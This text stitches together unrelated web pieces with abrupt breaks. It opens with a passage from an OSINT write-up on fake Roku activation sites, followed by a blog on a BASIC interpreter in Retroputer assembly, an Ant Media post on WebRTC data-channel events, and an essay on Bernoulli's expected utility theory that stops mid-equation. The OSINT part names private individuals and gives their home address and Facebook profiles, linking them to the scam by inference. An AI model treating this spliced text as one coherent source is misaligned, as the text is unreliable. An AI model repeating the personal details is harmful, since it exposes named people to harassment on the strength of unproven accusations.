<p>In sum, these lookalike websites are created and pushed on Google Ads to give the victims an impression that the website is associated with Roku and a payment fee is required to get started.</p>
<h2 id="same-scam-different-shill">Same scam different shill</h2>
<p>When I started to unravel this operation, what caught my eye was a single phone number. A <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.scammer.info/d/36984-888-990-4266-roku-activation">post on Scammer.info</a> and <a rel="nofollow noopener noreferrer" target="_blank" href="https://bobrtc.tel/numbers/d/888-990-4266-tech-support-scam">BobRTC</a> confirmed that <code>+1 888 990 4266</code> appear to be associated with Roku activation scams.</p>
<p>Then, a little research revealed that <code>+1 888 990 4266</code> is associated with two suspicious sites:</p>
<ul>
<li><code>rockstreamingmedia.com</code> (more about this later); and</li>
<li><code>cliqmediastream.com</code> (from the contact us page).</li>
</ul>
<div>
<p><a href="https://osint.fans/assets/images/cliqmediastream-contact-us.png" data-lightbox="identical-phone-numbers-linking-cliqmediastream-com-and-rockstreamingmedia-com-together" data-title="The top bar of cliqmediastream.com features +1 888 990 4266." data-alt="The top bar of cliqmediastream.com features +1 888 990 4266.">

<a href="https://osint.fans/assets/images/rockstreamingmedia-contact-us.png" data-lightbox="identical-phone-numbers-linking-cliqmediastream-com-and-rockstreamingmedia-com-together" data-title="Rokku Streaming Media also features +1 888 990 4266." data-alt="Rokku Streaming Media also features +1 888 990 4266.">

</a></p><figcaption>Identical phone numbers linking cliqmediastream.com and rockstreamingmedia.com together.</figcaption>
</div>
<p>Interestingly, <code>cliqmediastream.com</code> features two phone numbers. The top bar of <code>cliqmediastream.com</code> says the contact number is <code>+1 866 920 2601</code>. A little Google research reveals that <code>+1 866 920 2601</code> is also associated with a Roku scam running at <code>streamprosetup.com</code>, a similar site offering similar streaming device support and registration services.</p>
<div>
<figure>
<a href="https://osint.fans/assets/images/cliqmediastream-website.png" data-lightbox="did-cliqmediastream-com-forget-to-change-1-866-920-2601-in-the-top-bar" data-title="Did cliqmediastream.com forget to change +1 866 920 2601 in the top bar?" data-alt="Did cliqmediastream.com forget to change +1 866 920 2601 in the top bar?">

</picture>
</a>
<figcaption>Did cliqmediastream.com forget to change +1 866 920 2601 in the top bar?</figcaption>
</figure>
</div>
<p>The conclusion is that <code>cliqmediastream.com</code>, <code>rockstreamingmedia.com</code> and <code>streamprosetup.com</code> all belong to the same circle because of the identical phone numbers.</p>
<h3 id="going-down-the-rabbit-hole">Going down the rabbit hole</h3>
<p>Let’s dig into other details now. The company address listed on <code>streamprosetup.com</code> is <code>2810 Crossroads Drive, Suite 4011, Madison, WI-53590</code>, which is a boring office block.</p>

<p>It turns out that a large number of sites posing as Roku support also feature the same address in Madison for one reason or the other:</p>
<div><div><pre><code>ashstreamservices.com
byarvitsolutions.com
linkmediasetup.com
roku-tvactivation.com
rokutvactivation.com
setupstreamingdevice.com

</a></p><figcaption>No matter what linking code is entered, the activation process always fails.</figcaption>
</div>
<p>The similarities do not stop here. I found a handful of other websites having similarities with each other. For example, the Privacy Policy, the (fake) service description and/or other textual blurbs are identical on these sites indicating that these sites belong to the same circle.</p>
<div><div><pre><code>activatestreamingdevices.com

</code></pre></div></div>
<h3 id="branching-off-to-gps-software-update-scams">Branching off to GPS software update scams</h3>
<p>Interestingly, one of the domains at <code>streamysticks.online</code> features an Australian phone number: <code>+61 025 104 0010</code>.</p>
<p>It turns out the same phone number is featured on websites associated with Garmin and TomTom software update scams:</p>

<h2 id="are-these-websites-tied-to-a-us-company">Are these websites tied to a US company?</h2>
<p>Remember <code>rockstreamingmedia.com</code> from the beginning? The name of the company running this site – according to the Cancellation Policy page – is <strong>Rokku Streaming Media LLC</strong>.</p>

<figcaption>rockstreamingmedia.com claims its Rokku Streaming Media LLC is running the website.</figcaption>

</div>
<p>After digging into a handful of public company registers, it appears that a similarly named company <strong>Rokku Streaming Media Services LLC</strong> is registered in the office block at <code>2810 Crossroads Drive, Suite 4033, Madison, WI-53718</code> (very similar address featuring on the fake Roku sites from above). Is this a coincidence and someone is merely abusing the details of a legitimate company?</p>
<p>According to the company documents, Rokku Streaming Media Services LLC is providing <strong>Custom Computer Programming Services</strong> and the sole owner is <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.facebook.com/AAaulkah">Ms Gagandeep K Mangat</a>. Ms Mangat named <code>254 Moorland Place, Sun Prairie, WI 53590</code> as her contact address on the company register.</p>
<p>According to a <a rel="nofollow noopener noreferrer" target="_blank" href="https://urlscan.io/result/41b103dd-aa42-4907-9d9b-7cc30e74c05f/">public property directory</a>, Ms Mangat lives with a person named <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.facebook.com/japtej.singh.7">Japtej Aulakh</a> in Sun Prairie.</p>

<figcaption>Public records show that Ms Mangat and Ms Aulakh live together.</figcaption>

</div>
<p>After the careful analysis of the public posts of the Facebook profiles of Ms Mangat, <strong>Mr Aulakh is the husband of Ms Mangat</strong>, and the Sun Prairie address also from the company register is the couple’s home.</p>
<h3 id="further-companies">Further companies</h3>
<p>Ms Mangat runs two more companies named <strong>Divergent Group and Companies Inc.</strong> (divergentgroups.com) and <strong>Pro Tech Mind, LLC</strong> according to public records.</p>
<p>The latter company, Pro Tech Mind is <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.protechmind.com/">offering TV and home entertainment installation services</a> according to the website. Ms Mangat also appears to be associated with a similar company called <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.hellotech.com/">HelloTech</a>.</p>
<p>Interestingly, the same three employees work for both companies and they are called by different names.</p>

</a></p><figcaption>Are these employees identical twins?</figcaption>
</div>
<p>In parallel, the husband – Mr Aulakh – also manages a company named <strong>Cultivate Group LLC</strong>.</p>
<p>Each of the corporate entity is specialising in <strong>Custom Computer Programming Services</strong> according to the public records, just like Rokku Streaming Media LLC.</p>

<p>It is always exciting to have a new gadget at home. However, one should exercise great care when it comes to the initial setup and activation of the device. Scammers are setting up fake tech support sites and gaming the Google search results to get your money.</p>
<p>To avoid being scammed, always follow the on-screen instructions of your streaming device and never take shortcuts by doing a Google search for the setup page. If you are stuck, call the official tech support number of Roku or your streaming device brand.</p>
<p>What happens when a victim calls up one these support numbers? Here is an amusing video from Kitboga about his experience with a fake Roku tech support scam:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It’s funny the rabbit holes one ends up. One of my personal projects for several years has been the creation (exploration, really) of a “fake emulator” — that is, an emulator for a computer that never existed all written in JavaScript. Instead, the machine would pay homage to the eight and sixteen bit machines of the 1980s and ‘90s.</p>
<p>I like to do things the hard way, though: this machine would also be based on a novel instruction set as well. The instruction set would be similar to that of the era, but also be a little easier to use. And so, <a href="https://github.com/kerrishotts/retroputer" rel="noopener nofollow noreferrer">Retroputer</a> was born. Over several years, the implementation has been built out and improved, although it’ll probably never be “complete” (it’s a personal exploration, after all).</p>
<p>Then @bbcmicrobot became a thing, and I wanted to be able to do a similar thing for Retroputer. My JS development skills are mostly in the arena of the front-end, and so this would be a cool way to get some more back-end skills. One problem: Retroputer could only understand its own assembly language. It had no BASIC support yet.</p>
<p>And so here I am, building a BASIC interpreter, ‘80s style — that is, entirely in assembly language, just like it used to be done. And I thought I’d share that journey, since it’s not often we delve into areas so far from our typical abstractions. My daily driver (JavaScript) makes a lot of things trivial and sometimes those things feel magical. Understanding the lowest levels of the process can often help with understanding those abstractions.</p>
<p>And so… let’s begin.</p>
<h2 id="parsing-in-low-level-assembly-language">Parsing in Low-Level Assembly Language</h2>
<p>When I wrote the assembler for Retroputer, I was able to use a really nice tool called Pegjs. This made quick work of the assembler’s custom syntax, but was unfortunately there’s nothing like it for Retroputer ASM.</p>
<p>Which means we have to do it the hard way.</p>
<p>Parsing actually occurs in multiple phases. A language that uses a compiler parses the code into an abstract syntax tree (or similar concept), and can then use that tree to generate the resulting native code. A consequence of this is that the program must be syntactically correct in order for the compilation to be successful.</p>
<p>Some interpreters today also have this concept because it’s often useful to generate the intermediate AST and execute from there than it is to execute from the original source.</p>
<p>But for a BASIC interpreter in a machine with limited resources, the most resource-effective way to parse is to do it in multiple phases — some of which occurs at run time. This means, however, that syntax errors often can’t be detected until the program is run and the area of code with the error is encountered.</p>
<p>The three phases of Retroputer BASIC parsing are as follows:</p>
<ol>
<li>Line Transformation</li>
<li>Tokenization</li>
<li>Runtime Syntax Checking</li>
</ol>
<p>The first two steps occur as the user enters a program (or loads one). The last one occurs while the program is running. Essentially, the first two build out the rough scaffolding of an airplane, but with no guarantee of flight. The last step is essentially acting as a test pilot — hoping you’ll get off the ground, but not knowing until you try.</p>
<p>Thankfully Retroputer BASIC doesn’t come with such dire consequences for raising an error during runtime.</p>
<p><em><strong>Note:</strong></em> Source code (in progress) for Retroputer BASIC is <a href="https://github.com/kerrishotts/retroputer/tree/master/asm/kernel/basic" rel="noopener nofollow noreferrer">available on GitHub</a>.</p>
<h2 id="line-transformation">Line Transformation</h2>
<p>This is the easiest part of the entire process. Essentially, the line that the user enters is converted to uppercase so that later processes are easier (and faster). BASIC is not sensitive to case, and so we can use that to our advantage.</p>
<pre><code>print 2+2
' becomes:
PRINT 2+2
</code></pre>
<p>Doing this in JavaScript is easy, right?</p>
<pre><code>theLine = theLine.toUpperCase();
</code></pre>
<p>But in assembly language, we have to be more detailed about how things get done. We need to read in a character, convert it to uppercase, and then store it somewhere.</p>
<pre><code>           ld  y,  0                # y is our index
_loop:     ld  al, [d, x, y]        # [d,x] is pointer to string
           cmp al, 97               # is al (char) in range?
           brs n   _continue        # Not a lowercase char; continue
           cmp al, 123              # high portion
           brs !n  _continue        # not a lowercase char; continue
           and al, 0b1101_1111      # uppercase!
           st  [d, x, y], al        # store back (we modify the original)
_continue: inc y                    # move our index along
           cmp al, 0                # check for NULL
           brs !z _loop             # No? Go back for more.
</code></pre>
<p>The above doesn’t quite match the same semantics as the JavaScript version. One important difference is that we now use Unicode to work with text, and so converting input from lowercase to uppercase can often be more difficult — and maybe impossible (depending on the language). Retroputer lives in the world of ASCII (rather, it’s own variation, named RetSCII), meaning that all supported characters are encoded into eight bits. This is woefully inadequate for many languages, but also true to the period.</p>
<p>It also means that we can use a nice feature of ASCII to convert from lowercase to uppercase. It turns out that uppercase “A” is represented with <code>65</code> in ASCII, and lowercase “a” is represented with <code>97</code>. If you’re familiar with your powers-of-two, that difference should catch your eye.</p>
<p>So it turns out that lowercase letters are represented with a number that’s exactly 32 above the uppercase letter. Once we know something’s in range, all we need to do is subtract 32!</p>
<p>That works, but we could just do some bit twiddling. For Retroputer this wouldn’t actually be any faster than subtraction, but avoiding subtraction means we don’t have to worry about the carry/borrow flag during arithmetic. It turns out we can use a bitwise <code>and</code> to turn off the bit for the 32 place value instead.</p>
<pre><code>and al, 0b1101_1111         # turn off bit in 32-place
# versus
clr c                       # clear carry
sub al, 32                  # subtract 32
</code></pre>
<p>But there’s a catch: not <em>everything</em> can be converted to uppercase. If the user has included a string literal, for example, we have to be more careful. After all, we don’t want Retroputer BASIC to scream at the user all the time, right? (Although many computers of the era didn’t have lowercase capability, Retroputer doesn’t share that same limitation.)</p>
<p>For example:</p>
<pre><code>print "Hello, World!"
' should become:
PRINT "Hello, World!"
' and not
PRINT "HELLO, WORLD!"
</code></pre>
<p>This means we need to keep track of whether or not we’re in the middle of a string literal. In BASIC, there’s only one signifier for this: the double quote. If we check if a character is a double quote, we can set a flag, and depending on the flag’s value, we can perform an uppercase operation or leave things alone.</p>
<p>It turns out that in JavaScript there’s no built-in to accomplish this, but we can build one:</p>
<pre><code>const len = theLine.length;
let insideString = false;
for (let i = 0; i &lt; len; i++) {
    const ch = theLine[i];
    if (ch === `"`) insideString = !insideString;
    if (!insideString) {
        const newCh = ch.toUpperCase();
        if (ch !== newCh) theLine[i] = newCh;
    }
}
</code></pre>
<p>Now the logic of the JS more closely matches that of the assembly version, although we’re taking advantage of JS’s unicode support a bit more.</p>
<p>The assembly version looks like this:</p>
<pre><code>           ld  y,  0                # y is our index
           ld  bl, 0                # === insideString (false)
_loop:     ld  al, [d, x, y]        # [d,x] is pointer to string
           cmp al, 34               # is al a double quote?
           brs !z  check_char       # no? should we uppercase it?
           xor bl, 0xFF             # yes? toggle insideString
_check_char:
           cmp bl, 0xFF             # inside a string?
           brs z   _continue        # yes? don't modify it
           cmp al, 97               # is al (char) in range? "a"
           brs n   _continue        # Not a lowercase char; continue
           cmp al, 123              # high portion           "z"
           brs !n  _continue        # not a lowercase char; continue
           and al, 0b1101_1111      # uppercase!
           st  [d, x, y], al        # store back (we modify the original)
_continue: inc y                    # move our index along
           cmp al, 0                # check for NULL
           brs !z _loop             # No? Go back for more.
</code></pre>
<p>So far all we’ve done is transform the input text to uppercase, but there’s one extra benefit here in the way we’ve had to track if we’re inside a string. We can do one round of syntax checking here!</p>
<p>If, at the end of the process we find that <code>inString</code> is still true (<code>bl = 0xFF</code>), we can trigger an error, because it means that there’s an unterminated string literal somewhere in the line.</p>
<p><em><strong>Side note:</strong></em> It turns out many BASICs are quite lenient when it comes to terminating quotes for strings. One of many things I learned while building my own interpreter. Even so, it doesn’t feel right to me, and so Retroputer BASIC doesn’t permit it.</p>
<h2 id="tokenization">Tokenization</h2>
<p>The next phase of parsing involves converting an entered line into something more efficient for Retroputer BASIC to execute. This is as close to the concept of an abstract syntax tree that we’ll get here — the result will definitely not be a tree. But it will be something that we can quickly evaluate during runtime.</p>
<p>One common feature of early microcomputers was a very limited memory capacity. Retroputer has more memory than most machines of the time had by default, but it still has much less than modern machines. As such, long BASIC programs could easily consume far too much memory if they were stored as the user typed them.</p>
<p>To save space, keywords are <em>tokenized</em> as the program is entered into memory. This process converts keywords into single-byte tokens. Keywords are always at least two bytes long, and so this savings can add up. It also means that we can use a lookup table during execution to call the appropriate assembly language routines.</p>
<p>Retroputer BASIC goes a little further than most BASICs of the time, …</p></div></div>

<p>With the release of version 2.0, Ant Media Server Enterprise Edition supports WebRTC Data Channel standard and previously we posted 3 blog posts related to setup, usage and implementation of Data Channels with Ant Media Server EE:</p>
<ul>
<li><a href="https://antmedia.io/exchange-data-easily-using-webrtc-data-channels/">How to Exchange Data Easily Using WebRTC Data Channels with Ant Media Server</a></li>
<li><a href="https://antmedia.io/webrtc-chat-and-file-transfer/">WebRTC Chat and File Transfer Done Easily with Ant Media Server – Part 1</a></li>
<li><a href="https://antmedia.io/webrtc-chat-and-file-transfer-2/">WebRTC Chat and File Transfer Done Easily with Ant Media Server – Part 2</a></li>
</ul>
<p><a href="https://antmedia.io/exchange-data-easily-using-webrtc-data-channels/"></a>Our last blog post on this topic will be about sending control messages like actions and events through WebRTC Data Channels and about best practices when creating more interactive and complex applications through usage of these. We will examine 2 use case scenarios with some example usages from our Javascript and Android SDKs and try to make them more understandable for our customers.</p>
<p>Sending all kind of events or actions through data channels is the most convenient and secure way to implement interactive applications with WebRTC. Low latency and secure communication through Data Channels can be useful especially in case of interactive applications like in conferences, in e-learning or in some games where each participant has a certain role and allowed to do certain types of actions and can trigger certain events.</p>
<p><img src="https://antmedia.io/wp-content/uploads/2020/06/raising_hand-300x169.gif" alt="Build powerful interactive WebRTC Data Channel Applications with Actions and Events 1" width="423" height="238" srcset="https://antmedia.io/wp-content/uploads/2020/06/raising_hand-300x169.gif 300w, https://antmedia.io/wp-content/uploads/2020/06/raising_hand-1024x576.gif 1024w, https://antmedia.io/wp-content/uploads/2020/06/raising_hand-768x432.gif 768w, https://antmedia.io/wp-content/uploads/2020/06/raising_hand-600x338.gif 600w" sizes="(max-width: 423px) 100vw, 423px" title="Build powerful interactive WebRTC Data Channel Applications with Actions and Events 1"></p>
<p>For example in an e-learning application, a student can raise hand to ask a question and the teacher can decide to accept this request or reject it. If the request is accepted, the teacher and the other students will start playing the video stream of that student.</p>
<p>A similar scenario can also be realized for video conference applications of companies where the manager can allow employees to speak if requested during a presentation. Similarly voting on a subject during conferences or e-learning, communicating certain events like muted microphones, alerting or poking other users or sending game commands and events during WebRTC games can all be easily implemented through Data Channels.</p>
<h2>Message Format and Protocol</h2>
<p>As mentioned in <a href="https://antmedia.io/webrtc-chat-and-file-transfer/">our blog related to chat application</a>, we recommend sending events or user actions as structured data in JSON or XML. For most of the applications parsing them with common JSON or XML parsers in the receiver side would be enough but for complex applications having a validation schema like XML Schema or JSON Schema for these events can be useful and less error prone when validating, parsing, mapping them.</p>
<p>An example event in JSON format which are sent through data channel to all conference participants in our <a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank"><em>conference.html</em> </a>&nbsp;page when someone mutes his microphone looks like this:</p>
<pre><span>{
"streamId": "stream1",
"eventType": "MIC_MUTED"
}</span></pre>
<p>For more complex applications some kind of communication protocol is needed to manage the possible interactions between different users or the system. When designing such protocols for interactive and reactive applications, it is very important to clearly specify and examine what actions and events a user with a certain role can generate and which other states these events can lead to. In such cases, UML Sequence diagrams can be helpful to document and design the communication scenarios and UML State diagrams can help to handle all edge and use cases which are dependent on different states and roles. Next we will talk about a simple use case related conferences.</p>
<h3>Use Case: WebRTC Video Conference Events</h3>
<p>In latest version of our <a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank"><span><em>conference.html</em> </span></a>and <span><em>ConferenceActivity</em></span> in our WebRTC Android SDK, when a conference attendee mutes or unmutes his microphone or enables or disables his video stream for publishing, <a href="#Message_Format_and_Protocol">a special event message like in section above</a> is sent to the all the other conference participants, through WebRTC Data Channel. Then all other stream participants parse the received event and based on the event type the developer can customize the <a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank">conference.html</a> to notify the users or show an icon on the corresponding streams.</p>
<p>In Web side when the event receives the <span>“data_received”</span> signal in callback function is called:</p>
<pre><span>... else if(info == "data_received") { handleNotificationEvent(obj); }</span></pre>
<p>which then handles different notification events based on the event type:</p>
<pre><span>function handleNotificationEvent(obj) {</span>
<span>&nbsp; &nbsp; console.log("Received data : ", obj.event.data);</span>
<span>&nbsp; &nbsp; var notificationEvent = JSON.parse(obj.event.data);</span>
<span>&nbsp; &nbsp; if(notificationEvent != null &amp;&amp; typeof(notificationEvent) == "object") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; var eventStreamId = notificationEvent.streamId;</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; var eventTyp = notificationEvent.eventType;</span>

<span>&nbsp; &nbsp; &nbsp; &nbsp; if(eventTyp == "CAM_TURNED_OFF") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Camera turned off for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; } else if (eventTyp == "CAM_TURNED_ON") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Camera turned on for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;} else if (eventTyp == "MIC_MUTED") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Microphone muted for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;} </span><span>else if (eventTyp == "MIC_UNMUTED") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Microphone unmuted for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;}</span>
<span>&nbsp; &nbsp;}</span>
<span>}</span></pre>
<p>In this case for simplicity, it only logs them to the console. In Android in the <em><span>ConferenceActivity</span> <span>onMessage</span></em> method the notification events are handled analogously with Toast messages:</p>
<pre><span>public void onMessage(DataChannel.Buffer buffer, String dataChannelLabel) {</span>
<span>&nbsp; &nbsp; ByteBuffer data = buffer.data;</span>
<span>&nbsp; &nbsp; String strDataJson = new String(data.array(), StandardCharsets.UTF_8);</span>

<span>&nbsp; &nbsp; try {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;JSONObject json = new JSONObject(strDataJson);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;String eventType = json.getString("eventType");</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;String streamId = json.getString("streamId");</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;Toast.makeText(this, eventType + " : " + streamId, Toast.LENGTH_LONG).show();</span>
<span>&nbsp; &nbsp; } catch (Exception e) {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;Log.e(getClass().getSimpleName(), e.getMessage());</span>
<span>&nbsp; &nbsp; }</span>
<span>}</span></pre>
<p>Please check our <a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank"><span>conference.html</span></a> page in Web and <span>ConferenceActivity</span> in our Android WebRTC SDK to better understand how these messages are produced and handled.</p>
<h3>Use Case: Raising Hand in E-Learning</h3>
<p>A more complex case would be a student raising hand to ask a question in an E-learning application.</p>
<p>In our <span>hypothetical </span>scenario, multiple students can send raise hand messages approximately in the same time through WebRTC Data Channel and after that the teacher should decide to accept one of their requests or reject their requests. So the answer of the teacher should reference the unique stream id of the sender of the <span>RaiseHandRequest</span> which he accepted or rejected. If he accepts a request he will send accept message to everybody and the student whose request is accepted will automatically start publishing his video stream and the others will play it.</p>
<div id="attachment_30087"><p><img aria-describedby="caption-attachment-30087" src="https://antmedia.io/wp-content/uploads/2020/06/SequenceRaiseHand-1-1024x784.png" alt="WebRTC Raise Hand UML Sequence Diagram" width="1024" height="784" srcset="https://antmedia.io/wp-content/uploads/2020/06/SequenceRaiseHand-1-1024x784.png 1024w, https://antmedia.io/wp-content/uploads/2020/06/SequenceRaiseHand-1-300x230.png 300w, https://antmedia.io/wp-content/uploads/2020/06/SequenceRaiseHand-1-768x588.png 768w, https://antmedia.io/wp-content/uploads/2020/06/SequenceRaiseHand-1-1536x1176.png 1536w, https://antmedia.io/wp-content/uploads/2020/06/SequenceRaiseHand-1-2048x1568.png 2048w, https://antmedia.io/wp-content/uploads/2020/06/SequenceRaiseHand-1-600x459.png 600w" sizes="(max-width: 1024px) 100vw, 1024px" title="Build powerful interactive WebRTC Data Channel Applications with Actions and Events 2"></p><p id="caption-attachment-30087">UML Sequence Diagram of Raise Hand *</p></div><p>We are not showing here how to implement different roles for the students and teacher but one way to achieve this is for example having different customized versions of <span><a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank">conference.html</a></span> and <span>ConferenceActivity</span> for teacher and students. We can add also following constraint to our scenario; while a student is asking a question, no other student can request to ask any questions. To implement this constraint the state information can be stored in each participants with following possible states:</p>
<ol>
<li>Teaching</li>
<li>Question_Session_Empty</li>
<li>Question_Session_Full</li>
</ol>
<p>So the students can only ask questions when state is <span>Question_Session_Empty</span> and when state is <span>Question_Session_Full,</span>&nbsp;nobody can raise hand to ask questions. In our scenario the coordinator of the state will be the teacher and in edge case where a student is temporarily disconnected and reconnects, the current state should be sent to him by the teacher. (Another option is teacher sending the state regularly as some kind of keep alive message.)</p>
<p>In this scenario an example <span>RaiseHandRequest</span> request in JSON format would look like this:</p>
<pre><span>{</span>
<span>"senderId":"student1",</span>
<span>"eventType":"RaiseHandRequest",</span>
<span>"eventTime": 1592602900,</span>
<span>"description":"Question Related to Lesson 1"</span>
<span>}</span></pre>
<p>And a positive answer to his request from the teacher would look like this:</p>
<pre><span>{</span>
<span>"senderId":"teacher1",</span>
<span>"eventType":"RaiseHandAccept",</span>
<span>"eventTime": 1592602986,</span>
<span>"answerToRequest": "student1",</span>
<span>"description":"You have only 1 minute to ask"</span>
<span>}
</span></pre>
<p>After receiving this, the <span>student1</span> would start publishing his video stream and the others would start playing it.</p>
<p>In this blog post, we tried&nbsp; to inform our customers about some possible example use cases and the best practices when implementing interactive applications with WebRTC Data Channels. Here we talked about relatively simple use cases but an exciting variety of interactive and complex projects can be implemented using WebRTC Data Channels and Ant Media Server SDKs.&nbsp; We want to guide the developers when they are implementing their amazing and feature-rich projects using our SDKs.</p>
<p>Please be advised the methods and design decisions described here are not complete and not the only way to implement this kind of solutions. The design best suited to your needs can be a different one based on your requirements.<br>
<span>conference.html</span> and <span>ConferenceActivity</span> are included in&nbsp;our sample projects and WebRTC Data Channels are available to our customers with our Web, Android and IOS SDKs in version 2.0.<br>
If you have any questions, please drop a line to contact@antmedia.io.</p>
<h4 lang="zxx">Notes:</h4>

		<p>Not all academic fields have a clear starting point, a seminal paper that constitutes the foundation of the entire discipline. But economics does. The paper that defines modern formal economics was written by Daniel Bernoulli in 1738. It introduces expected utility theory. The main thrust of our work is, of course, to replace expected utility theory and instead work with time-average growth rates of wealth. I’ll mention how that works, but the focus of this post will be on something else. Bernoulli’s paper is not only conceptually misleading but also technically flawed in a sneaky way that keeps confusing everyone. Where Bernoulli determines the price to be paid for a risky prospect, he contradicts himself. I wouldn’t make such a fuss about this if the paper wasn’t so absolutely crucial. This basis of economics contains an error that invalidates commonly held beliefs and puts tens of thousands of studies into a different light. I recently <a href="https://twitter.com/ole_b_peters/status/963084568831119361">encouraged people, using twitter,</a> to read the paper and see for themselves. In this blog post I go through the relevant analysis step by step and address questions that came up in response to the tweet.</p>

<h2>Preliminaries</h2>
<p>Bernoulli’s paper was re-published in 1954 in <a href="https://www.econometricsociety.org/publications/econometrica/1954/01/01/exposition-new-theory-measurement-risk">Econometrica</a> (if you don’t like paywalls, here’s a <a href="http://bit.ly/2nShXn5">free pdf</a>). This is the standard translation from Latin, and page numbers below refer to it. I have not read the original Latin paper, but the error is spelled out in words, visually in a figure, and also in an equation, so this is not something lost in translation. If you have a copy of the original, please send it to me. <em>[2018-02-18 addendum: a scan of the original is <a href="https://archive.org/details/SpecimenTheoriaeNovaeDeMensuraSortis" target="_blank" rel="noopener">here</a>.]</em> The paper is so fundamental to economics that more than 200 years after its publication it was fished out of the proceedings of the Papers of the Imperial Academy of Sciences in Petersburg (Vol. V, 1738, pp. 175-192), translated into English, and published in the leading journal of the field.</p>
<h2>What is expected utility theory?</h2>
<p>Expected utility theory (EUT) is a form of decision theory. Imagine someone offers you a lottery ticket. Prior to Bernoulli, it was assumed that people roughly maximize the expected change in wealth resulting from such a gamble. That is, if initial wealth is <img src="https://s0.wp.com/latex.php?latex=x%28t%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x(t)" title="x(t)"> and possible changes in wealth are <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta x" title="\delta x"> then you’d maximize</p>
<p>(Eq.1)&nbsp;&nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+x%28t%2B%5Cdelta+t%29+-+x%28t%29+%5Crangle+%3D+%5Clangle+%5Cdelta+x%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle x(t+\delta t) - x(t) \rangle = \langle \delta x\rangle" title="\langle x(t+\delta t) - x(t) \rangle = \langle \delta x\rangle">.</p>
<p>Here, <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Ccdot+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \cdot \rangle" title="\langle \cdot \rangle"> is the expectation operator. Some people like to denote it by <img src="https://s0.wp.com/latex.php?latex=%5Cmathbb%7BE%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\mathbb{E}" title="\mathbb{E}"> but it’s same thing. If <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+x%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta x\rangle" title="\langle \delta x\rangle"> is positive, you’d buy the ticket, if it’s negative, you wouldn’t. But observations soon convinced everyone that this is not how people behave.</p>
<p>EUT was introduced as a refinement of this decision criterion. It says that you will choose the action that maximizes the expected change, not of your wealth but of your utility. The insight here is that people don’t evaluate gambles in isolation but with respect to a reference level (their initial wealth). An extra dollar is worth less to me if I’m rich than if I’m poor. Mathematically, a so-called utility function <img src="https://s0.wp.com/latex.php?latex=u%28x%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x)" title="u(x)"> is introduced, where <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x"> represents wealth.</p>
<p>The most commonly used utility function is <img src="https://s0.wp.com/latex.php?latex=u%28x%29%3D%5Clog+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x)=\log x" title="u(x)=\log x">. This is motivated by assuming that the extra utility someone attaches to an extra dollar is inversely proportional to the wealth that that someone already has, p.25:</p>

<p>Later on Bernoulli writes this assumption as the differential equation <img src="https://s0.wp.com/latex.php?latex=du+%3D+1%2Fx+dx&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="du = 1/x dx" title="du = 1/x dx">, whose solution is the logarithm. Let’s write down what EUT wants us to maximize:</p>
<p>(Eq.2) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u+%5Crangle+%3D+%5Clangle+%5Cln%5Bx%28t%2B%5Cdelta+t%29%5D-%5Cln%5Bx%28t%29%5D+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u \rangle = \langle \ln[x(t+\delta t)]-\ln[x(t)] \rangle" title="\langle \delta u \rangle = \langle \ln[x(t+\delta t)]-\ln[x(t)] \rangle">.</p>
<h3>What’s our conceptual critique?</h3>
<p>By re-writing this object you will immediately see that it actually means something else, and that’s the essence of our conceptual critique. Logarithms turn division into subtraction, <img src="https://s0.wp.com/latex.php?latex=%5Cln%28a%2Fb%29%3D%5Cln+a+-%5Cln+b&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\ln(a/b)=\ln a -\ln b" title="\ln(a/b)=\ln a -\ln b">. So (Eq.2) can be re-written as</p>
